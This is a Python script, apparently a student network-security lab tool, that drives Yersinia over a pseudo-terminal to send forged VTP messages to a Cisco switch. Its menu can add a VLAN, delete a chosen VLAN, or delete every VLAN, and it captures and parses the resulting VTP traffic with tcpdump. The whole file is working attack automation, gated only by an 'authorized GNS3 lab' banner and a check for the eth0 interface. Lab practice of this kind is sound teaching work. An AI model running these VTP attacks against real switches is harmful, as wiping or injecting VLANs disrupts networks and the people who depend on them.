#!/usr/bin/env python3
"""
VTP Attack Lab - Versión Mejorada (con animaciones y estilo premium)
Miguel Ramirez - TSI-203 - 2025-1367
"""

import os
import pty
import re
import select
import shutil
import signal
import struct
import subprocess
import sys
import termios
import threading
import time
from datetime import datetime
from pathlib import Path

try:
    import fcntl
except ImportError:
    fcntl = None

# ========================== COLORES ANSI PREMIUM ==========================
CYAN = "\033[96m"
GREEN = "\033[92m"
YELLOW = "\033[93m"
RED = "\033[91m"
BLUE = "\033[94m"
MAGENTA = "\033[95m"
WHITE = "\033[97m"
BOLD = "\033[1m"
RESET = "\033[0m"
DIM = "\033[2m"
UNDERLINE = "\033[4m"

def cprint(text, color=WHITE, bold=False, dim=False, underline=False):
    """Imprime texto con estilo."""
    style = ""
    if bold:
        style += BOLD
    if dim:
        style += DIM
    if underline:
        style += UNDERLINE
    print(f"{style}{color}{text}{RESET}")

# ========================== ANIMACIÓN / SPINNER ==========================
class Spinner:
    """Spinner animado en un hilo separado."""
    def __init__(self, message="Procesando", delay=0.1):
        self.message = message
        self.delay = delay
        self.running = False
        self.thread = None

    def _spin(self):
        chars = "|/-\\"
        i = 0
        while self.running:
            sys.stdout.write(f"\r{self.message} {chars[i]} ")
            sys.stdout.flush()
            time.sleep(self.delay)
            i = (i + 1) % len(chars)

    def start(self):
        self.running = True
        self.thread = threading.Thread(target=self._spin, daemon=True)
        self.thread.start()

    def stop(self, final_message=None):
        self.running = False
        if self.thread:
            self.thread.join(timeout=0.5)
        if final_message:
            sys.stdout.write(f"\r{final_message}  \n")
        else:
            sys.stdout.write(f"\r{self.message} ✅ Hecho.  \n")
        sys.stdout.flush()

def wait_with_spinner(seconds, message="Esperando", final_message=None):
    """Pausa con spinner animado."""
    spinner = Spinner(message)
    spinner.start()
    time.sleep(seconds)
    spinner.stop(final_message)

# ========================== CONSTANTES ==========================
LAB_IFACE = "eth0"
LAB_DOMAIN = "ITLA"
DEFAULT_VLAN_ID = 845
DEFAULT_VLAN_NAME = "LAB"
VTP_BPF = (
    "ether dst 01:00:0c:cc:cc:cc and "
    "(ether[20:2] = 0x2003 or ether[24:2] = 0x2003)"
)

# ========================== CABECERA DINÁMICA MEJORADA ==========================
def get_terminal_width():
    try:
        return shutil.get_terminal_size().columns
    except:
        return 80

def banner():
    width = min(get_terminal_width(), 80)
    if width < 50:
        width = 50

    # Textos
    title = "⚡ V T P   A T T A C K   L A B ⚡"
    author = "Miguel Ramirez  |  TSI-203  |  2025-1367"
    subtitle = "Yersinia Interactive Automation"

    # Centrar
    title = title.center(width)
    author = author.center(width)
    subtitle = subtitle.center(width)

    # Bordes
    top_border = "╔" + "═" * (width - 2) + "╗"
    bottom_border = "╚" + "═" * (width - 2) + "╝"
    empty_line = "║" + " " * (width - 2) + "║"

    print()
    cprint(top_border, CYAN, bold=True)
    cprint(empty_line, CYAN)
    cprint(f"║{title}║", WHITE, bold=True)
    cprint(empty_line, CYAN)
    cprint(f"║{author}║", MAGENTA)
    cprint(empty_line, CYAN)
    cprint(f"║{subtitle}║", YELLOW, bold=True)
    cprint(empty_line, CYAN)
    cprint(bottom_border, CYAN, bold=True)
    cprint(" 🔒 Uso exclusivo en laboratorio autorizado GNS3\n", RED, bold=True)

# ========================== UTILIDADES ==========================
def now():
    return datetime.now().strftime("%Y%m%d-%H%M%S")

def require_root():
    if os.geteuid() != 0:
        cprint("❌ ERROR: ejecuta como root", RED, bold=True)
        cprint("   sudo python3 /home/kali/vtp_attack_dinamico.py", YELLOW)
        sys.exit(1)

def require_tool(name):
    if not shutil.which(name):
        cprint(f"❌ ERROR: falta '{name}'", RED, bold=True)
        if name == "yersinia":
            cprint("   Instala con: sudo apt update && sudo apt install -y yersinia", YELLOW)
        elif name == "tcpdump":
            cprint("   Instala con: sudo apt update && sudo apt install -y tcpdump", YELLOW)
        sys.exit(1)

def ask(prompt, default=None):
    suffix = f" [{default}]" if default is not None else ""
    val = input(f"{CYAN}{prompt}{suffix}{RESET}: ").strip()
    return val if val else (str(default) if default is not None else "")

def ask_int(prompt, default, minv=None, maxv=None):
    while True:
        val = ask(prompt, default)
        try:
            num = int(val)
            if minv is not None and num < minv:
                cprint(f"   ⚠ Debe ser >= {minv}", RED)
                continue
            if maxv is not None and num > maxv:
                cprint(f"   ⚠ Debe ser <= {maxv}", RED)
                continue
            return num
        except ValueError:
            cprint("   ❌ Número inválido", RED)

def ask_vlan_name(default):
    val = ask("Nombre de VLAN", default).upper()
    val = re.sub(r"[^A-Z0-9_-]", "", val)
    if not val:
        val = default
    if len(val) > 12:
        val = val[:12]
    return val

def iface_exists(iface):
    return Path(f"/sys/class/net/{iface}").exists()

def iface_mac(iface):
    path = Path(f"/sys/class/net/{iface}/address")
    return path.read_text().strip() if path.exists() else "unknown"

def iface_state(iface):
    path = Path(f"/sys/class/net/{iface}/operstate")
    return path.read_text().strip() if path.exists() else "unknown"

def choose_iface():
    iface = ask("Interfaz conectada a SW1", LAB_IFACE)
    if iface != LAB_IFACE:
        cprint("❌ ERROR: solo se permite eth0 en este lab", RED, bold=True)
        sys.exit(1)
    if not iface_exists(iface):
        cprint("❌ ERROR: eth0 no existe", RED, bold=True)
        sys.exit(1)
    return iface

def confirm(text):
    val = ask(text + " (s/N)", "n")
    return val.lower() == "s"

# ========================== INSTALACIÓN AUTOMÁTICA ==========================
def install_dependencies():
    cprint("\n🔄 Instalando dependencias necesarias...", YELLOW, bold=True)
    packages = ["python3", "yersinia", "tcpdump"]
    for pkg in packages:
        cprint(f"   📦 Instalando {pkg}...", CYAN)
        subprocess.run(["sudo", "apt", "update", "-q"], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
        subprocess.run(["sudo", "apt", "install", "-y", pkg], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL, check=False)
    cprint("✅ Instalación completada.", GREEN, bold=True)

# ========================== TCPDUMP CAPTURE ==========================
class TcpdumpCapture:
    def __init__(self, iface, path):
        self.iface = iface
        self.path = Path(path)
        self.proc = None

    def start(self):
        args = ["tcpdump", "-eni", self.iface, "-vvv", "-s", "0", "-l", VTP_BPF]
        self.path.parent.mkdir(parents=True, exist_ok=True)
        self.handle = self.path.open("w", encoding="utf-8", errors="replace")
        self.handle.write(f"# Started {datetime.now().isoformat(timespec='seconds')}\n")
        self.handle.write(f"# CMD: {' '.join(args)}\n")
        self.handle.flush()
        self.proc = subprocess.Popen(
            args,
            stdin=subprocess.DEVNULL,
            stdout=self.handle,
            stderr=subprocess.STDOUT,
            text=True,
            start_new_session=True,
        )
        wait_with_spinner(1.5, "Iniciando captura de tráfico", "📡 Captura activa.")

    def stop(self):
        if self.proc and self.proc.poll() is None:
            try:
                os.killpg(os.getpgid(self.proc.pid), signal.SIGINT)
                self.proc.wait(timeout=3)
            except Exception:
                try:
                    os.killpg(os.getpgid(self.proc.pid), signal.SIGTERM)
                    self.proc.wait(timeout=3)
                except Exception:
                    try:
                        os.killpg(os.getpgid(self.proc.pid), signal.SIGKILL)
                    except Exception:
                        pass
        if hasattr(self, "handle"):
            self.handle.close()

# ========================== YERSINIA INTERACTIVE ==========================
class YersiniaInteractive:
    def __init__(self, raw_log):
        self.raw_log = Path(raw_log)
        self.pid = None
        self.fd = None
        self.stop_reader = threading.Event()
        self.reader = None
        self.raw_handle = None

    def start(self):
        self.raw_log.parent.mkdir(parents=True, exist_ok=True)
        self.raw_handle = self.raw_log.open("wb")
        pid, fd = pty.fork()
        if pid == 0:
            os.environ["TERM"] = "xterm"
            os.environ["LINES"] = "40"
            os.environ["COLUMNS"] = "120"
            os.execvp("yersinia", ["yersinia", "-I"])
        self.pid = pid
        self.fd = fd
        self._set_window(40, 120)
        self.reader = threading.Thread(target=self._read_loop, daemon=True)
        self.reader.start()
        wait_with_spinner(1.5, "Lanzando Yersinia", "🔄 Yersinia listo.")

    def _set_window(self, rows, cols):
        if fcntl is None or self.fd is None:
            return
        winsz = struct.pack("HHHH", rows, cols, 0, 0)
        try:
            fcntl.ioctl(self.fd, termios.TIOCSWINSZ, winsz)
        except OSError:
            pass

    def _read_loop(self):
        while not self.stop_reader.is_set():
            try:
                r, _, _ = select.select([self.fd], [], [], 0.2)
                if not r:
                    continue
                data = os.read(self.fd, 4096)
                if not data:
                    break
                if self.raw_handle:
                    self.raw_handle.write(data)
                    self.raw_handle.flush()
            except OSError:
                break

    def send(self, data, delay=0.7):
        if self.fd is None:
            return
        if isinstance(data, str):
            data = data.encode()
        os.write(self.fd, data)
        time.sleep(delay)

    def select_vtp_mode(self):
        cprint("   🎯 Abriendo modo VTP en Yersinia...", CYAN)
        self.send("\r", 1.0)
        self.send(" ", 0.5)
        self.send("g", 0.8)
        self.send("\x1bOB\r", 1.2)

    def send_request(self):
        cprint("   📤 Enviando VTP request...", CYAN)
        self.send("x", 0.8)
        self.send("0", 2.0)

    def delete_all_vlans(self):
        cprint("   🗑  Ejecutando ataque 1: borrar TODAS las VLANs", YELLOW, bold=True)
        self.send("x", 0.8)
        self.send("1", 2.0)
        self.send_request()

    def delete_one_vlan(self, vlan_id):
        cprint(f"   🗑  Ejecutando ataque 2: borrar VLAN {vlan_id}", YELLOW, bold=True)
        self.send("x", 0.8)
        self.send("2", 0.8)
        self.send(f"{vlan_id:04d}", 0.5)
        self.send("\r", 2.0)
        self.send_request()

    def add_vlan(self, vlan_id, vlan_name):
        cprint(f"   ➕ Ejecutando ataque 3: agregar VLAN {vlan_id} ({vlan_name})", YELLOW, bold=True)
        self.send("x", 0.8)
        self.send("3", 0.8)
        self.send(f"{vlan_id:04d}", 0.5)
        self.send(f"{vlan_name}\r", 2.0)
        self.send_request()

    def stop(self):
        if self.pid:
            try:
                pgid = os.getpgid(self.pid)
            except Exception:
                pgid = None
            try:
                if pgid is not None:
                    os.killpg(pgid, signal.SIGINT)
                else:
                    os.kill(self.pid, signal.SIGINT)
                time.sleep(1)
            except Exception:
                pass
            try:
                if pgid is not None:
                    os.killpg(pgid, signal.SIGTERM)
                else:
                    os.kill(self.pid, signal.SIGTERM)
            except Exception:
                pass
        self.stop_reader.set()
        if self.fd is not None:
            try:
                os.close(self.fd)
            except OSError:
                pass
        if self.reader:
            self.reader.join(timeout=2)
        if self.raw_handle:
            self.raw_handle.close()

# ========================== PARSEO DE CAPTURA ==========================
def run_cli_vtp_request(iface, seconds=3):
    args = ["yersinia", "vtp", "-interface", iface, "-attack", "0"]
    try:
        subprocess.run(
            args,
            stdin=subprocess.DEVNULL,
            stdout=subprocess.DEVNULL,
            stderr=subprocess.DEVNULL,
            timeout=seconds,
            check=False,
        )
    except subprocess.TimeoutExpired:
        pass

def parse_vtp_packets(text):
    packets = []
    current = None
    header_re = re.compile(
        r"^(?P<time>\d\d:\d\d:\d\d\.\d+)\s+"
        r"(?P<src>(?:[0-9a-f]{2}:){5}[0-9a-f]{2})\s+>\s+"
        r"01:00:0c:cc:cc:cc,.*Message (?P<kind>[^,]+)",
        re.IGNORECASE,
    )
    rev_re = re.compile(r"Config Rev (?P<rev>[0-9a-fA-F]+)")
    vlan_re = re.compile(r"VLAN-id (?P<vid>\d+),.*?Name (?P<name>[^\n]+)")

    for line in text.splitlines():
        header = header_re.search(line)
        if header:
            if current:
                packets.append(current)
            current = {
                "time": header.group("time"),
                "src": header.group("src").lower(),
                "kind": header.group("kind").strip(),
                "rev": None,
                "vlans": [],
            }
            continue
        if current is None:
            continue
        rev = rev_re.search(line)
        if rev:
            current["rev"] = rev.group("rev")
        vlan = vlan_re.search(line)
        if vlan:
            current["vlans"].append((int(vlan.group("vid")), vlan.group("name").strip()))
    if current:
        packets.append(current)
    return packets

def parse_capture(path, vlan_id=None):
    text = Path(path).read_text(encoding="utf-8", errors="replace")
    packets = parse_vtp_packets(text)
    revs = [pkt["rev"] for pkt in packets if pkt["rev"]]
    subset_packets = [pkt for pkt in packets if pkt["vlans"]]
    final_subset = subset_packets[-1] if subset_packets else None

    cprint("\n📊 Resumen de captura tcpdump", CYAN, bold=True, underline=True)
    print(f"   Archivo: {path}")
    if revs:
        print(f"   Revisiones VTP vistas: {', '.join(revs[-6:])}")
    else:
        cprint("   ⚠ No vi revisiones VTP en la captura.", RED)

    if final_subset:
        print(
            "   Última base VTP anunciada: "
            f"{final_subset['time']} src={final_subset['src']} rev={final_subset['rev']}"
        )
        print("   VLANs finales vistas en el último subset:")
        for vid, name in final_subset["vlans"]:
            print(f"      - {vid} {name}")
    else:
        cprint("   ⚠ No vi entradas VLAN en anuncios subset.", RED)

    if vlan_id is not None and final_subset:
        final_ids = {vid for vid, _ in final_subset["vlans"]}
        if vlan_id in final_ids:
            cprint(f"\n✅ Evidencia final: la VLAN {vlan_id} aparece en la DB VTP.", GREEN, bold=True)
        else:
            cprint(f"\n❌ La VLAN {vlan_id} NO aparece en la DB VTP final.", RED, bold=True)

# ========================== EJECUCIÓN DE ATAQUE ==========================
def run_attack(iface, attack, vlan_id=None, vlan_name=None, duration=10):
    timestamp = now()
    cap_path = f"/tmp/vtp-attack-{timestamp}.log"
    raw_path = f"/tmp/vtp-yersinia-{timestamp}.raw"

    capture = TcpdumpCapture(iface, cap_path)
    yersinia = YersiniaInteractive(raw_path)

    cprint(f"\n📁 Captura tcpdump: {cap_path}", CYAN)
    cprint(f"📁 Log bruto Yersinia: {raw_path}", CYAN)

    try:
        capture.start()
        yersinia.start()
        yersinia.select_vtp_mode()

        if attack == "add":
            yersinia.add_vlan(vlan_id, vlan_name)
        elif attack == "delete_all":
            yersinia.delete_all_vlans()
        elif attack == "delete_one":
            yersinia.delete_one_vlan(vlan_id)
        else:
            raise ValueError("ataque desconocido")

        wait_with_spinner(duration, "⏳ Esperando que SW1 procese VTP", "✅ Procesamiento completado.")

        cprint("   🔍 Mandando request CLI extra para verificar DB actual...", CYAN)
        run_cli_vtp_request(iface)
        wait_with_spinner(3, "   Esperando respuesta", "   ✅ Listo.")
    finally:
        yersinia.stop()
        capture.stop()

    parse_capture(cap_path, vlan_id if attack in ("add", "delete_one") else None)
    cprint("\n✅ Valida ahora en SW1 con:", GREEN, bold=True)
    print("   show vlan brief")
    print("   show vtp status")
    print("   show interfaces trunk")

# ========================== MAIN ==========================
def main():
    banner()
    require_root()

    # ----- PREGUNTA DE PRIMERA VEZ -----
    first_time = ask("¿Es la primera vez que ejecutas este script? (s/n)", "n")
    if first_time.lower() == "s":
        install_dependencies()
    else:
        cprint("✅ Continuando sin instalación.", CYAN)

    require_tool("yersinia")
    require_tool("tcpdump")

    iface = choose_iface()
    cprint(f"\n🔗 {iface}: state={iface_state(iface)} mac={iface_mac(iface)}", CYAN)
    cprint("📋 Requisitos esperados en SW1:", YELLOW, bold=True)
    print("   vtp domain ITLA")
    print("   vtp version 1")
    print("   vtp mode server")
    print("   sin vtp password")
    print("   Gi0/1 trunk, native VLAN 1, allowed VLANs 1,10,20\n")

    while True:
        print("\n" + "="*60)
        cprint("   🎯 MENÚ PRINCIPAL", BLUE, bold=True)
        print("="*60)
        cprint("   1.  Agregar una VLAN", GREEN)
        cprint("   2.  Borrar una VLAN específica", YELLOW)
        cprint("   3.  Borrar TODAS las VLANs", RED, bold=True)
        cprint("   4.  Solo VTP request y capturar DB actual", CYAN)
        cprint("   5.  Salir", MAGENTA)
        print("="*60)

        choice = ask_int("Opción", 5, 1, 5)

        if choice == 1:
            vlan_id = ask_int("ID de VLAN", DEFAULT_VLAN_ID, 2, 1001)
            vlan_name = ask_vlan_name(DEFAULT_VLAN_NAME)
            if not confirm(f"¿Agregar VLAN {vlan_id} ({vlan_name})?"):
                cprint("   ❌ Cancelado.", RED)
                continue
            run_attack(iface, "add", vlan_id=vlan_id, vlan_name=vlan_name, duration=10)

        elif choice == 2:
            vlan_id = ask_int("ID de VLAN a borrar", DEFAULT_VLAN_ID, 2, 1001)
            if not confirm(f"¿Borrar VLAN {vlan_id}?"):
                cprint("   ❌ Cancelado.", RED)
                continue
            run_attack(iface, "delete_one", vlan_id=vlan_id, duration=10)

        elif choice == 3:
            if not confirm("⚠  ¿Borrar TODAS las VLANs?"):
                cprint("   ❌ Cancelado.", RED)
                continue
            run_attack(iface, "delete_all", duration=10)

        elif choice == 4:
            timestamp = now()
            cap_path = f"/tmp/vtp-verify-{timestamp}.log"
            capture = TcpdumpCapture(iface, cap_path)
            try:
                capture.start()
                run_cli_vtp_request(iface)
                wait_with_spinner(5, "   Esperando respuesta", "   ✅ Listo.")
            finally:
                capture.stop()
            parse_capture(cap_path)

        elif choice == 5:
            cprint("\n👋 Saliendo... ¡Hasta luego!", GREEN, bold=True)
            break

        again = ask("\n🤔 ¿Otra acción? (S/n)", "S")
        if again.lower() != "s":
            cprint("\n👋 Saliendo... ¡Hasta luego!", GREEN, bold=True)
            break

if __name__ == "__main__":
    try:
        main()
    except KeyboardInterrupt:
        cprint("\n⚠  Cancelado por el usuario.", RED, bold=True)
               
